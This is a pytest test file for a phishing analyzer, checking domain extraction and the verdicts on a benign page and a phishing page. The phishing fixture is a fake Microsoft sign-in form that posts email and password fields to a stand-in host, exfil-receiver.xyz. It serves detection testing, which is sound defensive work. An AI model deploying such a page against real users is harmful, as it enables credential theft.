import pytest
from app.services.phishing_analyzer import analyze_phishing, extract_registered_domain


def test_extract_registered_domain():
    assert extract_registered_domain("login.paypal.com") == "paypal.com"
    assert extract_registered_domain("secure.auth.microsoft.com") == "microsoft.com"
    assert extract_registered_domain("malicious-site.xyz") == "malicious-site.xyz"


def test_phishing_detection_credential_harvesting():
    phishing_html = """
    <!DOCTYPE html>
    <html>
      <head><title>Sign in to your Microsoft account</title></head>
      <body>
        <h1>Microsoft</h1>
        <p>Sign in to your account</p>
        <form action="https://exfil-receiver.xyz/collect" method="POST">
          <input type="email" name="loginfmt" placeholder="Email" />
          <input type="password" name="passwd" placeholder="Password" />
          <button type="submit">Sign in</button>
        </form>
      </body>
    </html>
    """

    result = analyze_phishing(
        url="http://login-microsoft-portal.xyz/login",
        html_content=phishing_html,
    )

    assert result["verdict"] == "PHISHING"
    assert result["phishing_risk_score"] >= 0.75
    assert result["credential_harvesting"]["detected"] is True
    assert result["credential_harvesting"]["has_external_submission"] is True
    assert result["brand_impersonation"]["detected"] is True

    impersonated = result["brand_impersonation"]["brands"]
    assert any(b["brand"] == "Microsoft" and not b["is_authorized_domain"] for b in impersonated)


def test_phishing_detection_benign_page():
    benign_html = """
    <!DOCTYPE html>
    <html>
      <head><title>Welcome to Example Blog</title></head>
      <body>
        <h1>Tech Articles and News</h1>
        <p>Read our latest posts on cloud architecture and Python programming.</p>
        <a href="/archive">View Archive</a>
      </body>
    </html>
    """

    result = analyze_phishing(
        url="https://example-blog.org/articles",
        html_content=benign_html,
    )

    assert result["verdict"] == "CLEAN"
    assert result["phishing_risk_score"] < 0.40
    assert result["credential_harvesting"]["detected"] is False
    assert result["brand_impersonation"]["detected"] is False

